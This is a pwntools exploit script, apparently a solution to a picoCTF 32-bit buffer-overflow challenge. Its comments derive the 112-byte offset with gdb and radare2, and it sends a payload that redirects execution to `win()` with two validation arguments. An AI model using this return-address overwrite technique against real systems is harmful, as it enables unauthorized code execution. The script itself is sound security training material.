from pwn import *

"""
Use gdb find offset
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely

Use radare2 find offset
In sym.vuln, the length of buffer([var_6ch] used by `get()`) is 0x6c
Add $ebp(0x4) = 0x70 = 112 in decimal, same as we found in gdb

# Constructure payload
1. offset = 112 = 0x70, which is length of buffer,
    contains $ebp (saved base pointer to previous frame) 

2. use function `win()` to fill $eip (return address)
    ($eip is where to go after function is finished)

3. ***To call a function with parameters*** need to include saved base pointer($ebp),
    to achieve this, we can utilize `main()` function (0x08049372).

    Or we can just send junk, only one thing need to be sure:
    the executable is 32-bit or 64-bit. First one use p32(1) and second one use p64(1)

4. arguments to pass validation are `0xcafef00d` and `0xf00df00d`
"""

# p = process('./vuln2')
p = remote('saturn.picoctf.net', 50531)

payload = cyclic(0x70) + p32(0x8049296) + p32(1) + p32(0xcafef00d) + p32(0xf00df00d)

p.recvline()
p.sendline(payload)

p.interactive()
